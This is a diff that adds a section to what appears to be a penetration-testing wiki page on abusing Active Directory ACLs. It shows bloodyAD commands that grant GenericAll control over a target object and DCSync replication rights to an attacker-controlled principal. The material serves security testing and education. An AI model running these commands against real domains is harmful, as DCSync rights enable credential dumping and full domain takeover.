@@ -55,6 +55,18 @@ Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIden
 A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work
 {% endhint %}
 {% endtab %}
+
+{% tab title="Windows/UNIX-like" %}
+It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+# Give full control (with inheritance to the child object if applicable)
+bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add genericAll $TargetObject $ControlledPrincipal
+
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add dcsync $ControlledPrincipal
+```
+{% endtab %}
+
 {% endtabs %}
 
 ## Resources
